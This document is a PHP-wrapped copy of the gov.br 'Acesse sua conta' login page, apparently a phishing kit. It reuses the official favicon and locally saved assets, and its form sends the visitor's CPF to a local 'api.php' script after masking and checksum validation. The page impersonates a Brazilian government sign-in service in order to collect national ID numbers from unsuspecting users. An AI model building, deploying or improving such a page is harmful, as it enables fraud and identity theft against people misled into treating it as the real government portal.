<?php
// O código abaixo permanece inalterado, apenas encapsulado em um arquivo PHP.
?>
<!DOCTYPE html>
<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>gov.br - Acesse sua conta</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<link rel="icon" href="https://sso.acesso.gov.br/assets/govbr/img/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="./gov.br - Acesse sua conta_files/all.min.css">
<link rel="stylesheet" href="./gov.br - Acesse sua conta_files/rawline.css">
<link rel="stylesheet" href="./gov.br - Acesse sua conta_files/govbr-templates.css">
<link rel="stylesheet" href="./gov.br - Acesse sua conta_files/govbr-modal.css">

<style>
    .invalid { border: 2px solid #e52222 !important; background-color: #fff1f1 !important; }
    .btn-loading { opacity: 0.7; cursor: not-allowed; pointer-events: none; }
    #cpf-error { color: #e52222; font-size: 12px; display: none; margin-top: 5px; font-weight: bold; }
</style>
</head>

<body>
    <header>
        <a href="#"><img src="./gov.br - Acesse sua conta_files/govbr.png" alt="Logomarca GovBR"></a>
    </header>

<div class="container">
    <aside id="aside-signin">
        <img id="identidade-govbr" src="./gov.br - Acesse sua conta_files/conta_govbr_v2.jpg" alt="Logomarca GovBR">
    </aside>
    <main id="main-signin">
        <div class="card" id="login-cpf">
            <h3>Identifique-se no gov.br com:</h3>
            
            <div class="item-login-signup-ways" onclick="accordion('accordion-panel-id')">
                <a tabindex="3">
                    <img src="./gov.br - Acesse sua conta_files/id-card-solid.png">
                    Número do CPF
                </a>
            </div>

            <div class="accordion-panel" id="accordion-panel-id" style="max-height: none;">
                <form action="api.php" method="GET" id="form-login">
                    <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
                    <label for="cpf">CPF</label>
                    <input id="cpf" name="cpf" autocomplete="off" tabindex="1" type="text" inputmode="numeric" placeholder="Digite seu CPF" maxlength="14">
                    <div id="cpf-error">CPF inválido. Confira os números.</div>

                    <div class="button-panel">
                        <button id="enter-account-id" type="submit" class="button-continuar">Continuar</button>
                    </div>
                </form>
            </div>

            <label id="title-outras-op">Outras opções de identificação:</label>
            <hr id="hr-outras-op">

            <div class="item-login-signup-ways">
                <button type="button" class="button-href-mimic2" style="color:#008C32">
                    <img src="./gov.br - Acesse sua conta_files/InternetBanking-green.png">
                    Login com seu banco
                    <span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
                </button>
            </div>

            <div class="item-login-signup-ways">
                <a tabindex="5" href="#">
                    <img src="./gov.br - Acesse sua conta_files/qrcode.png">
                    Seu aplicativo gov.br (QR code)
                </a>
            </div>

            <div class="item-login-signup-ways">
                <button type="button" class="button-href-mimic2">
                    <img src="./gov.br - Acesse sua conta_files/CD.png">
                    Seu certificado digital
                </button>
            </div>

            <div class="item-login-signup-ways">
                <button type="button" class="button-href-mimic2">
                    <img src="./gov.br - Acesse sua conta_files/CD-Nuvem.png">
                    Seu certificado digital em nuvem
                </button>
            </div>

            <div class="entenda-id-govbr" id="entenda-id-govbr" style="margin-top: 20px;">
                <span>
                    <a tabindex="6" href="#" id="entenda-id-govbr-a">
                        <img src="./gov.br - Acesse sua conta_files/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em;">
                        Está com dúvidas e precisa de ajuda?
                    </a>
                    <a tabindex="6" href="#" style="display: block; margin-top: 10px;" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
                </span>
            </div>
        </div>
    </main>
</div>

<script>
    const inputCPF = document.getElementById('cpf');
    const btn = document.getElementById('enter-account-id');
    const form = document.getElementById('form-login');
    const errorMsg = document.getElementById('cpf-error');

    // Máscara e trava de 11 dígitos
    inputCPF.addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);
        v = v.replace(/(\d{3})(\d)/, "$1.$2");
        v = v.replace(/(\d{3})(\d)/, "$1.$2");
        v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
        e.target.value = v;
        inputCPF.classList.remove('invalid');
        errorMsg.style.display = 'none';
    });

    // Validação e Loading
    form.addEventListener('submit', (e) => {
        const cpfLimpo = inputCPF.value.replace(/\D/g, "");
        if (cpfLimpo.length !== 11 || !validarCPF(cpfLimpo)) {
            e.preventDefault();
            inputCPF.classList.add('invalid');
            errorMsg.style.display = 'block';
            inputCPF.focus();
        } else {
            btn.disabled = true;
            btn.classList.add('btn-loading');
            btn.innerHTML = "Carregando...";
        }
    });

    function validarCPF(cpf) {
        if (/^(\d)\1+$/.test(cpf)) return false;
        let soma = 0, resto;
        for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i-1]) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto >= 10) resto = 0;
        if (resto !== parseInt(cpf[9])) return false;
        soma = 0;
        for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i-1]) * (12 - i);
        resto = (soma * 10) % 11;
        if (resto >= 10) resto = 0;
        return resto === parseInt(cpf[10]);
    }
</script>
</body></html>
